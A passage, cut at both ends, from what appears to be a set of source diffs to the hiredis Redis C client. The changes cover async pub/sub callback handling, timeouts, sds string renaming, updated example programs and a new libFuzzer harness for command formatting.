    \        assert(reply->element[0]->type == REDIS_REPLY_STRING);\n         stype\
    \ = reply->element[0]->str;\n         pvariant = (tolower(stype[0]) == 'p') ?\
    \ 1 : 0;\n@@ -435,7 +433,7 @@ static int __redisGetSubscribeCallback(redisAsyncContext\
    \ *ac, redisReply *reply,\n \n         /* Locate the right callback */\n     \
    \    assert(reply->element[1]->type == REDIS_REPLY_STRING);\n-        sname =\
    \ hi_sdsnewlen(reply->element[1]->str,reply->element[1]->len);\n+        sname\
    \ = sdsnewlen(reply->element[1]->str,reply->element[1]->len);\n         if (sname\
    \ == NULL)\n             goto oom;\n \n@@ -462,14 +460,21 @@ static int __redisGetSubscribeCallback(redisAsyncContext\
    \ *ac, redisReply *reply,\n                 /* Unset subscribed flag only when\
    \ no pipelined pending subscribe. */\n                 if (reply->element[2]->integer\
    \ == 0\n                     && dictSize(ac->sub.channels) == 0\n-           \
    \         && dictSize(ac->sub.patterns) == 0)\n+                    && dictSize(ac->sub.patterns)\
    \ == 0) {\n                     c->flags &= ~REDIS_SUBSCRIBED;\n+\n+         \
    \           /* Move ongoing regular command callbacks. */\n+                 \
    \   redisCallback cb;\n+                    while (__redisShiftCallback(&ac->sub.replies,&cb)\
    \ == REDIS_OK) {\n+                        __redisPushCallback(&ac->replies,&cb);\n\
    +                    }\n+                }\n             }\n         }\n-    \
    \    hi_sdsfree(sname);\n+        sdsfree(sname);\n     } else {\n-        /*\
    \ Shift callback for invalid commands. */\n-        __redisShiftCallback(&ac->sub.invalid,dstcb);\n\
    +        /* Shift callback for pending command in subscribed context. */\n+  \
    \      __redisShiftCallback(&ac->sub.replies,dstcb);\n     }\n     return REDIS_OK;\n\
    \ oom:\n@@ -497,36 +502,32 @@ static int redisIsSubscribeReply(redisReply *reply)\
    \ {\n     len = reply->element[0]->len - off;\n \n     return !strncasecmp(str,\
    \ \"subscribe\", len) ||\n-           !strncasecmp(str, \"message\", len);\n-\n\
    +           !strncasecmp(str, \"message\", len) ||\n+           !strncasecmp(str,\
    \ \"unsubscribe\", len);\n }\n \n void redisProcessCallbacks(redisAsyncContext\
    \ *ac) {\n     redisContext *c = &(ac->c);\n-    redisCallback cb = {NULL, NULL,\
    \ 0, NULL};\n     void *reply = NULL;\n     int status;\n \n     while((status\
    \ = redisGetReply(c,&reply)) == REDIS_OK) {\n         if (reply == NULL) {\n \
    \            /* When the connection is being disconnected and there are\n    \
    \          * no more replies, this is the cue to really disconnect. */\n-    \
    \        if (c->flags & REDIS_DISCONNECTING && hi_sdslen(c->obuf) == 0\n+    \
    \        if (c->flags & REDIS_DISCONNECTING && sdslen(c->obuf) == 0\n        \
    \         && ac->replies.head == NULL) {\n                 __redisAsyncDisconnect(ac);\n\
    \                 return;\n             }\n-\n-            /* If monitor mode,\
    \ repush callback */\n-            if(c->flags & REDIS_MONITORING) {\n-      \
    \          __redisPushCallback(&ac->replies,&cb);\n-            }\n-\n       \
    \      /* When the connection is not being disconnected, simply stop\n       \
    \       * trying to get replies and wait for the next loop tick. */\n        \
    \     break;\n         }\n \n+        /* Keep track of push message support for\
    \ subscribe handling */\n+        if (redisIsPushReply(reply)) c->flags |= REDIS_SUPPORTS_PUSH;\n\
    +\n         /* Send any non-subscribe related PUSH messages to our PUSH handler\n\
    \          * while allowing subscribe related PUSH messages to pass through.\n\
    \          * This allows existing code to be backward compatible and work in\n\
    @@ -539,6 +540,7 @@ void redisProcessCallbacks(redisAsyncContext *ac) {\n \n \
    \        /* Even if the context is subscribed, pending regular\n          * callbacks\
    \ will get a reply before pub/sub messages arrive. */\n+        redisCallback\
    \ cb = {NULL, NULL, 0, NULL};\n         if (__redisShiftCallback(&ac->replies,&cb)\
    \ != REDIS_OK) {\n             /*\n              * A spontaneous reply in a not-subscribed\
    \ context can be the error\n@@ -562,15 +564,17 @@ void redisProcessCallbacks(redisAsyncContext\
    \ *ac) {\n                 __redisAsyncDisconnect(ac);\n                 return;\n\
    \             }\n-            /* No more regular callbacks and no errors, the\
    \ context *must* be subscribed or monitoring. */\n-            assert((c->flags\
    \ & REDIS_SUBSCRIBED || c->flags & REDIS_MONITORING));\n-            if(c->flags\
    \ & REDIS_SUBSCRIBED)\n+            /* No more regular callbacks and no errors,\
    \ the context *must* be subscribed. */\n+            assert(c->flags & REDIS_SUBSCRIBED);\n\
    +            if (c->flags & REDIS_SUBSCRIBED)\n                 __redisGetSubscribeCallback(ac,reply,&cb);\n\
    \         }\n \n         if (cb.fn != NULL) {\n             __redisRunCallback(ac,&cb,reply);\n\
    -            c->reader->fn->freeObject(reply);\n+            if (!(c->flags &\
    \ REDIS_NO_AUTO_FREE_REPLIES)){\n+                c->reader->fn->freeObject(reply);\n\
    +            }\n \n             /* Proceed with free'ing when redisAsyncFree()\
    \ was called. */\n             if (c->flags & REDIS_FREEING) {\n@@ -584,6 +588,11\
    \ @@ void redisProcessCallbacks(redisAsyncContext *ac) {\n              * doesn't\
    \ know what the server will spit out over the wire. */\n             c->reader->fn->freeObject(reply);\n\
    \         }\n+\n+        /* If in monitor mode, repush the callback */\n+    \
    \    if (c->flags & REDIS_MONITORING) {\n+            __redisPushCallback(&ac->replies,&cb);\n\
    +        }\n     }\n \n     /* Disconnect when there was an error reading the\
    \ reply */\n@@ -605,7 +614,8 @@ static int __redisAsyncHandleConnect(redisAsyncContext\
    \ *ac) {\n \n     if (redisCheckConnectDone(c, &completed) == REDIS_ERR) {\n \
    \        /* Error! */\n-        redisCheckSocketError(c);\n+        if (redisCheckSocketError(c)\
    \ == REDIS_ERR)\n+            __redisAsyncCopyError(ac);\n         __redisAsyncHandleConnectFailure(ac);\n\
    \         return REDIS_ERR;\n     } else if (completed == 1) {\n@@ -691,13 +701,22\
    \ @@ void redisAsyncHandleTimeout(redisAsyncContext *ac) {\n     redisContext\
    \ *c = &(ac->c);\n     redisCallback cb;\n \n-    if ((c->flags & REDIS_CONNECTED)\
    \ && ac->replies.head == NULL) {\n-        /* Nothing to do - just an idle timeout\
    \ */\n-        return;\n+    if ((c->flags & REDIS_CONNECTED)) {\n+        if\
    \ (ac->replies.head == NULL && ac->sub.replies.head == NULL) {\n+            /*\
    \ Nothing to do - just an idle timeout */\n+            return;\n+        }\n\
    +\n+        if (!ac->c.command_timeout ||\n+            (!ac->c.command_timeout->tv_sec\
    \ && !ac->c.command_timeout->tv_usec)) {\n+            /* A belated connect timeout\
    \ arriving, ignore */\n+            return;\n+        }\n     }\n \n     if (!c->err)\
    \ {\n         __redisSetError(c, REDIS_ERR_TIMEOUT, \"Timeout\");\n+        __redisAsyncCopyError(ac);\n\
    \     }\n \n     if (!(c->flags & REDIS_CONNECTED) && ac->onConnect) {\n@@ -744,7\
    \ +763,7 @@ static int __redisAsyncCommand(redisAsyncContext *ac, redisCallbackFn\
    \ *fn, void\n     const char *cstr, *astr;\n     size_t clen, alen;\n     const\
    \ char *p;\n-    hisds sname;\n+    sds sname;\n     int ret;\n \n     /* Don't\
    \ accept new commands when the connection is about to be closed. */\n@@ -768,7\
    \ +787,7 @@ static int __redisAsyncCommand(redisAsyncContext *ac, redisCallbackFn\
    \ *fn, void\n \n         /* Add every channel/pattern to the list of subscription\
    \ callbacks. */\n         while ((p = nextArgument(p,&astr,&alen)) != NULL) {\n\
    -            sname = hi_sdsnewlen(astr,alen);\n+            sname = sdsnewlen(astr,alen);\n\
    \             if (sname == NULL)\n                 goto oom;\n \n@@ -786,7 +805,7\
    \ @@ static int __redisAsyncCommand(redisAsyncContext *ac, redisCallbackFn *fn,\
    \ void\n \n             ret = dictReplace(cbdict,sname,&cb);\n \n-           \
    \ if (ret == 0) hi_sdsfree(sname);\n+            if (ret == 0) sdsfree(sname);\n\
    \         }\n     } else if (strncasecmp(cstr,\"unsubscribe\\r\\n\",13) == 0)\
    \ {\n         /* It is only useful to call (P)UNSUBSCRIBE when the context is\n\
    @@ -796,17 +815,19 @@ static int __redisAsyncCommand(redisAsyncContext *ac, redisCallbackFn\
    \ *fn, void\n         /* (P)UNSUBSCRIBE does not have its own response: every\
    \ channel or\n          * pattern that is unsubscribed will receive a message.\
    \ This means we\n          * should not append a callback function for this command.\
    \ */\n-     } else if(strncasecmp(cstr,\"monitor\\r\\n\",9) == 0) {\n-       \
    \  /* Set monitor flag and push callback */\n-         c->flags |= REDIS_MONITORING;\n\
    -         __redisPushCallback(&ac->replies,&cb);\n+    } else if (strncasecmp(cstr,\"\
    monitor\\r\\n\",9) == 0) {\n+        /* Set monitor flag and push callback */\n\
    +        c->flags |= REDIS_MONITORING;\n+        if (__redisPushCallback(&ac->replies,&cb)\
    \ != REDIS_OK)\n+            goto oom;\n     } else {\n-        if (c->flags &\
    \ REDIS_SUBSCRIBED)\n-            /* This will likely result in an error reply,\
    \ but it needs to be\n-             * received and passed to the callback. */\n\
    -            __redisPushCallback(&ac->sub.invalid,&cb);\n-        else\n-    \
    \        __redisPushCallback(&ac->replies,&cb);\n+        if (c->flags & REDIS_SUBSCRIBED)\
    \ {\n+            if (__redisPushCallback(&ac->sub.replies,&cb) != REDIS_OK)\n\
    +                goto oom;\n+        } else {\n+            if (__redisPushCallback(&ac->replies,&cb)\
    \ != REDIS_OK)\n+                goto oom;\n+        }\n     }\n \n     __redisAppendCommand(c,cmd,len);\n\
    @@ -817,6 +838,7 @@ static int __redisAsyncCommand(redisAsyncContext *ac, redisCallbackFn\
    \ *fn, void\n     return REDIS_OK;\n oom:\n     __redisSetError(&(ac->c), REDIS_ERR_OOM,\
    \ \"Out of memory\");\n+    __redisAsyncCopyError(ac);\n     return REDIS_ERR;\n\
    \ }\n \n@@ -845,14 +867,14 @@ int redisAsyncCommand(redisAsyncContext *ac, redisCallbackFn\
    \ *fn, void *privdata\n }\n \n int redisAsyncCommandArgv(redisAsyncContext *ac,\
    \ redisCallbackFn *fn, void *privdata, int argc, const char **argv, const size_t\
    \ *argvlen) {\n-    hisds cmd;\n-    int len;\n+    sds cmd;\n+    long long len;\n\
    \     int status;\n     len = redisFormatSdsCommandArgv(&cmd,argc,argv,argvlen);\n\
    \     if (len < 0)\n         return REDIS_ERR;\n     status = __redisAsyncCommand(ac,fn,privdata,cmd,len);\n\
    -    hi_sdsfree(cmd);\n+    sdsfree(cmd);\n     return status;\n }\n "
  - "--- a/dict.c\n+++ b/dict.c\n@@ -267,16 +267,11 @@ static dictEntry *dictFind(dict\
    \ *ht, const void *key) {\n     return NULL;\n }\n \n-static dictIterator *dictGetIterator(dict\
    \ *ht) {\n-    dictIterator *iter = hi_malloc(sizeof(*iter));\n-    if (iter ==\
    \ NULL)\n-        return NULL;\n-\n+static void dictInitIterator(dictIterator\
    \ *iter, dict *ht) {\n     iter->ht = ht;\n     iter->index = -1;\n     iter->entry\
    \ = NULL;\n     iter->nextEntry = NULL;\n-    return iter;\n }\n \n static dictEntry\
    \ *dictNext(dictIterator *iter) {\n@@ -299,10 +294,6 @@ static dictEntry *dictNext(dictIterator\
    \ *iter) {\n     return NULL;\n }\n \n-static void dictReleaseIterator(dictIterator\
    \ *iter) {\n-    hi_free(iter);\n-}\n-\n /* ------------------------- private\
    \ functions ------------------------------ */\n \n /* Expand the hash table if\
    \ needed */"
  - "--- a/examples/example-libuv.c\n+++ b/examples/example-libuv.c\n@@ -7,26 +7,41\
    \ @@\n #include <async.h>\n #include <adapters/libuv.h>\n \n+void debugCallback(redisAsyncContext\
    \ *c, void *r, void *privdata) {\n+    (void)privdata; //unused\n+    redisReply\
    \ *reply = r;\n+    if (reply == NULL) {\n+        /* The DEBUG SLEEP command\
    \ will almost always fail, because we have set a 1 second timeout */\n+      \
    \  printf(\"`DEBUG SLEEP` error: %s\\n\", c->errstr ? c->errstr : \"unknown error\"\
    );\n+        return;\n+    }\n+    /* Disconnect after receiving the reply of\
    \ DEBUG SLEEP (which will not)*/\n+    redisAsyncDisconnect(c);\n+}\n+\n void\
    \ getCallback(redisAsyncContext *c, void *r, void *privdata) {\n     redisReply\
    \ *reply = r;\n-    if (reply == NULL) return;\n-    printf(\"argv[%s]: %s\\n\"\
    , (char*)privdata, reply->str);\n+    if (reply == NULL) {\n+        printf(\"\
    `GET key` error: %s\\n\", c->errstr ? c->errstr : \"unknown error\");\n+     \
    \   return;\n+    }\n+    printf(\"`GET key` result: argv[%s]: %s\\n\", (char*)privdata,\
    \ reply->str);\n \n-    /* Disconnect after receiving the reply to GET */\n- \
    \   redisAsyncDisconnect(c);\n+    /* start another request that demonstrate timeout\
    \ */\n+    redisAsyncCommand(c, debugCallback, NULL, \"DEBUG SLEEP %f\", 1.5);\n\
    \ }\n \n void connectCallback(const redisAsyncContext *c, int status) {\n    \
    \ if (status != REDIS_OK) {\n-        printf(\"Error: %s\\n\", c->errstr);\n+\
    \        printf(\"connect error: %s\\n\", c->errstr);\n         return;\n    \
    \ }\n     printf(\"Connected...\\n\");\n }\n \n void disconnectCallback(const\
    \ redisAsyncContext *c, int status) {\n     if (status != REDIS_OK) {\n-     \
    \   printf(\"Error: %s\\n\", c->errstr);\n+        printf(\"disconnect because\
    \ of error: %s\\n\", c->errstr);\n         return;\n     }\n     printf(\"Disconnected...\\\
    n\");\n@@ -49,8 +64,18 @@ int main (int argc, char **argv) {\n     redisLibuvAttach(c,loop);\n\
    \     redisAsyncSetConnectCallback(c,connectCallback);\n     redisAsyncSetDisconnectCallback(c,disconnectCallback);\n\
    +    redisAsyncSetTimeout(c, (struct timeval){ .tv_sec = 1, .tv_usec = 0});\n\
    +\n+    /*\n+    In this demo, we first `set key`, then `get key` to demonstrate\
    \ the basic usage of libuv adapter.\n+    Then in `getCallback`, we start a `debug\
    \ sleep` command to create 1.5 second long request.\n+    Because we have set\
    \ a 1 second timeout to the connection, the command will always fail with a\n\
    +    timeout error, which is shown in the `debugCallback`.\n+    */\n+\n     redisAsyncCommand(c,\
    \ NULL, NULL, \"SET key %b\", argv[argc-1], strlen(argv[argc-1]));\n     redisAsyncCommand(c,\
    \ getCallback, (char*)\"end-1\", \"GET key\");\n+\n     uv_run(loop, UV_RUN_DEFAULT);\n\
    \     return 0;\n }"
  - "--- a/examples/example-push.c\n+++ b/examples/example-push.c\n@@ -31,7 +31,6\
    \ @@\n #include <stdlib.h>\n #include <string.h>\n #include <hiredis.h>\n-#include\
    \ <win32.h>\n \n #define KEY_COUNT 5\n "
  - "--- a/examples/example-ssl.c\n+++ b/examples/example-ssl.c\n@@ -4,7 +4,10 @@\n\
    \ \n #include <hiredis.h>\n #include <hiredis_ssl.h>\n-#include <win32.h>\n+\n\
    +#ifdef _MSC_VER\n+#include <winsock2.h> /* For struct timeval */\n+#endif\n \n\
    \ int main(int argc, char **argv) {\n     unsigned int j;"
  - "--- a/examples/example.c\n+++ b/examples/example.c\n@@ -2,7 +2,10 @@\n #include\
    \ <stdlib.h>\n #include <string.h>\n #include <hiredis.h>\n-#include <win32.h>\n\
    +\n+#ifdef _MSC_VER\n+#include <winsock2.h> /* For struct timeval */\n+#endif\n\
    \ \n int main(int argc, char **argv) {\n     unsigned int j, isunix = 0;"
  - '--- a/fuzzing/format_command_fuzzer.c

    +++ b/fuzzing/format_command_fuzzer.c

    @@ -0,0 +1,57 @@

    +/*

    + * Copyright (c) 2020, Salvatore Sanfilippo <antirez at gmail dot com>

    + * Copyright (c) 2020, Pieter Noordhuis <pcnoordhuis at gmail dot com>

    + * Copyright (c) 2020, Matt Stancliff <matt at genges dot com>,

    + *                     Jan-Erik Rediger <janerik at fnordig dot com>

    + *

    + * All rights reserved.

    + *

    + * Redistribution and use in source and binary forms, with or without

    + * modification, are permitted provided that the following conditions are met:

    + *

    + *   * Redistributions of source code must retain the above copyright notice,

    + *     this list of conditions and the following disclaimer.

    + *   * Redistributions in binary form must reproduce the above copyright

    + *     notice, this list of conditions and the following disclaimer in the

    + *     documentation and/or other materials provided with the distribution.

    + *   * Neither the name of Redis nor the names of its contributors may be used

    + *     to endorse or promote products derived from this software without

    + *     specific prior written permission.

    + *

    + * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"

    + * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE

    + * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE

    + * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE

    + * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR

    + * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF

    + * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS

    + * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN

    + * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)

    + * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE

    + * POSSIBILITY OF SUCH DAMAGE.

    + */

    +

    +#include <stdlib.h>

    +#include <string.h>

    +#include "hiredis.h"

    +

    +int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {

    +    char *new_str, *cmd;

    +

    +    if (size < 3)

    +        return 0;

    +

    +    new_str = malloc(size+1);

    +    if (new_str == NULL)

    +        return 0;

    +

    +    memcpy(new_str, data, size);

    +    new_str[size] = ''\0'';

    +

    +    redisFormatCommand(&cmd, new_str);

    +

    +    if (cmd != NULL)

    +        hi_free(cmd);

    +    free(new_str);

    +    return 0;

    +}'
  - "--- a/hiredis.c\n+++ b/hiredis.c\n@@ -96,6 +96,8 @@ void freeReplyObject(void\
    \ *reply) {\n \n     switch(r->type) {\n     case REDIS_REPLY_INTEGER:\n+    case\
    \ REDIS_REPLY_NIL:\n+    case REDIS_REPLY_BOOL:\n         break; /* Nothing to\
    \ free */\n     case REDIS_REPLY_ARRAY:\n     case REDIS_REPLY_MAP:\n@@ -112,6\
    \ +114,7 @@ void freeReplyObject(void *reply) {\n     case REDIS_REPLY_STRING:\n\
    \     case REDIS_REPLY_DOUBLE:\n     case REDIS_REPLY_VERB:\n+    case REDIS_REPLY_BIGNUM:\n\
    \         hi_free(r->str);\n         break;\n     }\n@@ -129,7 +132,8 @@ static\
    \ void *createStringObject(const redisReadTask *task, char *str, size_t len\n\
    \     assert(task->type == REDIS_REPLY_ERROR  ||\n            task->type == REDIS_REPLY_STATUS\
    \ ||\n            task->type == REDIS_REPLY_STRING ||\n-           task->type\
    \ == REDIS_REPLY_VERB);\n+           task->type == REDIS_REPLY_VERB   ||\n+  \
    \         task->type == REDIS_REPLY_BIGNUM);\n \n     /* Copy string value */\n\
    \     if (task->type == REDIS_REPLY_VERB) {\n@@ -235,12 +239,14 @@ static void\
    \ *createDoubleObject(const redisReadTask *task, double value, char *s\n     \
    \ * decimal string conversion artifacts. */\n     memcpy(r->str, str, len);\n\
    \     r->str[len] = '\\0';\n+    r->len = len;\n \n     if (task->parent) {\n\
    \         parent = task->parent->obj;\n         assert(parent->type == REDIS_REPLY_ARRAY\
    \ ||\n                parent->type == REDIS_REPLY_MAP ||\n-               parent->type\
    \ == REDIS_REPLY_SET);\n+               parent->type == REDIS_REPLY_SET ||\n+\
    \               parent->type == REDIS_REPLY_PUSH);\n         parent->element[task->idx]\
    \ = r;\n     }\n     return r;\n@@ -257,7 +263,8 @@ static void *createNilObject(const\
    \ redisReadTask *task) {\n         parent = task->parent->obj;\n         assert(parent->type\
    \ == REDIS_REPLY_ARRAY ||\n                parent->type == REDIS_REPLY_MAP ||\n\
    -               parent->type == REDIS_REPLY_SET);\n+               parent->type\
    \ == REDIS_REPLY_SET ||\n+               parent->type == REDIS_REPLY_PUSH);\n\
    \         parent->element[task->idx] = r;\n     }\n     return r;\n@@ -276,7 +283,8\
    \ @@ static void *createBoolObject(const redisReadTask *task, int bval) {\n  \
    \       parent = task->parent->obj;\n         assert(parent->type == REDIS_REPLY_ARRAY\
    \ ||\n                parent->type == REDIS_REPLY_MAP ||\n-               parent->type\
    \ == REDIS_REPLY_SET);\n+               parent->type == REDIS_REPLY_SET ||\n+\
    \               parent->type == REDIS_REPLY_PUSH);\n         parent->element[task->idx]\
    \ = r;\n     }\n     return r;\n@@ -305,7 +313,7 @@ int redisvFormatCommand(char\
    \ **target, const char *format, va_list ap) {\n     const char *c = format;\n\
    \     char *cmd = NULL; /* final command */\n     int pos; /* position in final\
    \ command */\n-    hisds curarg, newarg; /* current argument */\n+    sds curarg,\
    \ newarg; /* current argument */\n     int touched = 0; /* was the current argument\
    \ touched? */\n     char **curargv = NULL, **newargv = NULL;\n     int argc =\
    \ 0;\n@@ -318,7 +326,7 @@ int redisvFormatCommand(char **target, const char *format,\
    \ va_list ap) {\n         return -1;\n \n     /* Build the command string accordingly\
    \ to protocol */\n-    curarg = hi_sdsempty();\n+    curarg = sdsempty();\n  \
    \   if (curarg == NULL)\n         return -1;\n \n@@ -330,15 +338,15 @@ int redisvFormatCommand(char\
    \ **target, const char *format, va_list ap) {\n                     if (newargv\
    \ == NULL) goto memory_err;\n                     curargv = newargv;\n       \
    \              curargv[argc++] = curarg;\n-                    totlen += bulklen(hi_sdslen(curarg));\n\
    +                    totlen += bulklen(sdslen(curarg));\n \n                 \
    \    /* curarg is put in argv so it can be overwritten. */\n-                \
    \    curarg = hi_sdsempty();\n+                    curarg = sdsempty();\n    \
    \                 if (curarg == NULL) goto memory_err;\n                     touched\
    \ = 0;\n                 }\n             } else {\n-                newarg = hi_sdscatlen(curarg,c,1);\n\
    +                newarg = sdscatlen(curarg,c,1);\n                 if (newarg\
    \ == NULL) goto memory_err;\n                 curarg = newarg;\n             \
    \    touched = 1;\n@@ -355,16 +363,16 @@ int redisvFormatCommand(char **target,\
    \ const char *format, va_list ap) {\n                 arg = va_arg(ap,char*);\n\
    \                 size = strlen(arg);\n                 if (size > 0)\n-     \
    \               newarg = hi_sdscatlen(curarg,arg,size);\n+                   \
    \ newarg = sdscatlen(curarg,arg,size);\n                 break;\n            \
    \ case 'b':\n                 arg = va_arg(ap,char*);\n                 size =\
    \ va_arg(ap,size_t);\n                 if (size > 0)\n-                    newarg\
    \ = hi_sdscatlen(curarg,arg,size);\n+                    newarg = sdscatlen(curarg,arg,size);\n\
    \                 break;\n             case '%':\n-                newarg = hi_sdscat(curarg,\"\
    %\");\n+                newarg = sdscat(curarg,\"%\");\n                 break;\n\
    \             default:\n                 /* Try to detect printf format */\n@@\
    \ -452,7 +460,7 @@ int redisvFormatCommand(char **target, const char *format,\
    \ va_list ap) {\n                     if (_l < sizeof(_format)-2) {\n        \
    \                 memcpy(_format,c,_l);\n                         _format[_l]\
    \ = '\\0';\n-                        newarg = hi_sdscatvprintf(curarg,_format,_cpy);\n\
    +                        newarg = sdscatvprintf(curarg,_format,_cpy);\n \n   \
    \                      /* Update current position (note: outer blocks\n      \
    \                    * increment c twice so compensate here) */\n@@ -479,9 +487,9\
    \ @@ int redisvFormatCommand(char **target, const char *format, va_list ap) {\n\
    \         if (newargv == NULL) goto memory_err;\n         curargv = newargv;\n\
    \         curargv[argc++] = curarg;\n-        totlen += bulklen(hi_sdslen(curarg));\n\
    +        totlen += bulklen(sdslen(curarg));\n     } else {\n-        hi_sdsfree(curarg);\n\
    +        sdsfree(curarg);\n     }\n \n     /* Clear curarg because it was put\
    \ in curargv or was free'd. */\n@@ -496,10 +504,10 @@ int redisvFormatCommand(char\
    \ **target, const char *format, va_list ap) {\n \n     pos = sprintf(cmd,\"*%d\\\
    r\\n\",argc);\n     for (j = 0; j < argc; j++) {\n-        pos += sprintf(cmd+pos,\"\
    $%zu\\r\\n\",hi_sdslen(curargv[j]));\n-        memcpy(cmd+pos,curargv[j],hi_sdslen(curargv[j]));\n\
    -        pos += hi_sdslen(curargv[j]);\n-        hi_sdsfree(curargv[j]);\n+  \
    \      pos += sprintf(cmd+pos,\"$%zu\\r\\n\",sdslen(curargv[j]));\n+        memcpy(cmd+pos,curargv[j],sdslen(curargv[j]));\n\
    +        pos += sdslen(curargv[j]);\n+        sdsfree(curargv[j]);\n         cmd[pos++]\
    \ = '\\r';\n         cmd[pos++] = '\\n';\n     }\n@@ -521,11 +529,11 @@ int redisvFormatCommand(char\
    \ **target, const char *format, va_list ap) {\n cleanup:\n     if (curargv) {\n\
    \         while(argc--)\n-            hi_sdsfree(curargv[argc]);\n+          \
    \  sdsfree(curargv[argc]);\n         hi_free(curargv);\n     }\n \n-    hi_sdsfree(curarg);\n\
    +    sdsfree(curarg);\n     hi_free(cmd);\n \n     return error_type;\n@@ -558,19\
    \ +566,18 @@ int redisFormatCommand(char **target, const char *format, ...) {\n\
    \     return len;\n }\n \n-/* Format a command according to the Redis protocol\
    \ using an hisds string and\n- * hi_sdscatfmt for the processing of arguments.\
    \ This function takes the\n+/* Format a command according to the Redis protocol\
    \ using an sds string and\n+ * sdscatfmt for the processing of arguments. This\
    \ function takes the\n  * number of arguments, an array with arguments and an\
    \ array with their\n  * lengths. If the latter is set to NULL, strlen will be\
    \ used to compute the\n  * argument lengths.\n  */\n-int redisFormatSdsCommandArgv(hisds\
    \ *target, int argc, const char **argv,\n-                              const\
    \ size_t *argvlen)\n+long long redisFormatSdsCommandArgv(sds *target, int argc,\
    \ const char **argv,\n+                                    const size_t *argvlen)\n\
    \ {\n-    hisds cmd, aux;\n-    unsigned long long totlen;\n+    sds cmd, aux;\n\
    +    unsigned long long totlen, len;\n     int j;\n-    size_t len;\n \n     /*\
    \ Abort on a NULL target */\n     if (target == NULL)\n@@ -584,48 +591,48 @@ int\
    \ redisFormatSdsCommandArgv(hisds *target, int argc, const char **argv,\n    \
    \ }\n \n     /* Use an SDS string for command construction */\n-    cmd = hi_sdsempty();\n\
    +    cmd = sdsempty();\n     if (cmd == NULL)\n         return -1;\n \n     /*\
    \ We already know how much storage we need */\n-    aux = hi_sdsMakeRoomFor(cmd,\
    \ totlen);\n+    aux = sdsMakeRoomFor(cmd, totlen);\n     if (aux == NULL) {\n\
    -        hi_sdsfree(cmd);\n+        sdsfree(cmd);\n         return -1;\n     }\n\
    \ \n     cmd = aux;\n \n     /* Construct command */\n-    cmd = hi_sdscatfmt(cmd,\
    \ \"*%i\\r\\n\", argc);\n+    cmd = sdscatfmt(cmd, \"*%i\\r\\n\", argc);\n   \
    \  for (j=0; j < argc; j++) {\n         len = argvlen ? argvlen[j] : strlen(argv[j]);\n\
    -        cmd = hi_sdscatfmt(cmd, \"$%u\\r\\n\", len);\n-        cmd = hi_sdscatlen(cmd,\
    \ argv[j], len);\n-        cmd = hi_sdscatlen(cmd, \"\\r\\n\", sizeof(\"\\r\\\
    n\")-1);\n+        cmd = sdscatfmt(cmd, \"$%U\\r\\n\", len);\n+        cmd = sdscatlen(cmd,\
    \ argv[j], len);\n+        cmd = sdscatlen(cmd, \"\\r\\n\", sizeof(\"\\r\\n\"\
    )-1);\n     }\n \n-    assert(hi_sdslen(cmd)==totlen);\n+    assert(sdslen(cmd)==totlen);\n\
    \ \n     *target = cmd;\n     return totlen;\n }\n \n-void redisFreeSdsCommand(hisds\
    \ cmd) {\n-    hi_sdsfree(cmd);\n+void redisFreeSdsCommand(sds cmd) {\n+    sdsfree(cmd);\n\
    \ }\n \n /* Format a command according to the Redis protocol. This function takes\
    \ the\n  * number of arguments, an array with arguments and an array with their\n\
    \  * lengths. If the latter is set to NULL, strlen will be used to compute the\n\
    \  * argument lengths.\n  */\n-int redisFormatCommandArgv(char **target, int argc,\
    \ const char **argv, const size_t *argvlen) {\n+long long redisFormatCommandArgv(char\
    \ **target, int argc, const char **argv, const size_t *argvlen) {\n     char *cmd\
    \ = NULL; /* final command */\n-    int pos; /* position in final command */\n\
    -    size_t len;\n-    int totlen, j;\n+    size_t pos; /* position in final command\
    \ */\n+    size_t len, totlen;\n+    int j;\n \n     /* Abort on a NULL target\
    \ */\n     if (target == NULL)\n@@ -697,7 +704,7 @@ static redisContext *redisContextInit(void)\
    \ {\n \n     c->funcs = &redisContextDefaultFuncs;\n \n-    c->obuf = hi_sdsempty();\n\
    +    c->obuf = sdsempty();\n     c->reader = redisReaderCreate();\n     c->fd\
    \ = REDIS_INVALID_FD;\n \n@@ -714,7 +721,7 @@ void redisFree(redisContext *c)\
    \ {\n         return;\n     redisNetClose(c);\n \n-    hi_sdsfree(c->obuf);\n\
    +    sdsfree(c->obuf);\n     redisReaderFree(c->reader);\n     hi_free(c->tcp.host);\n\
    \     hi_free(c->tcp.source_addr);\n@@ -751,10 +758,10 @@ int redisReconnect(redisContext\
    \ *c) {\n \n     redisNetClose(c);\n \n-    hi_sdsfree(c->obuf);\n+    sdsfree(c->obuf);\n\
    \     redisReaderFree(c->reader);\n \n-    c->obuf = hi_sdsempty();\n+    c->obuf\
    \ = sdsempty();\n     c->reader = redisReaderCreate();\n \n     if (c->obuf ==\
    \ NULL || c->reader == NULL) {\n@@ -796,6 +803,9 @@ redisContext *redisConnectWithOptions(const\
    \ redisOptions *options) {\n     if (options->options & REDIS_OPT_NOAUTOFREE)\
    \ {\n         c->flags |= REDIS_NO_AUTO_FREE;\n     }\n+    if (options->options\
    \ & REDIS_OPT_NOAUTOFREEREPLIES) {\n+        c->flags |= REDIS_NO_AUTO_FREE_REPLIES;\n\
    +    }\n \n     /* Set any user supplied RESP3 PUSH handler or use freeReplyObject\n\
    \      * as a default unless specifically flagged that we don't want one. */\n\
    @@ -824,7 +834,7 @@ redisContext *redisConnectWithOptions(const redisOptions *options)\
    \ {\n         c->fd = options->endpoint.fd;\n         c->flags |= REDIS_CONNECTED;\n\
    \     } else {\n-        // Unknown type - FIXME - FREE\n+        redisFree(c);\n\
